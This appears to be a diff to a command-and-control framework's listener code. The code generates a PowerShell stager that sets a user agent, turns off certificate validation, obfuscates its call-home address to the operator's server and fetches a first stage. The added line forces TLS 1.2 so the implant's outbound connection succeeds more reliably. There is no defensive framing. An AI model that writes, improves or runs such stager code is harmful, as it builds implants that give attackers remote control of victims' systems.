@@ -379,6 +379,7 @@ class Listener(object):
                 stager += "$u='" + userAgent + "';"
                 if 'https' in host:
                     # allow for self-signed certificates for https connections
+                    stager += "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
                     stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
                 stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
                 if userAgent.lower() != 'none':
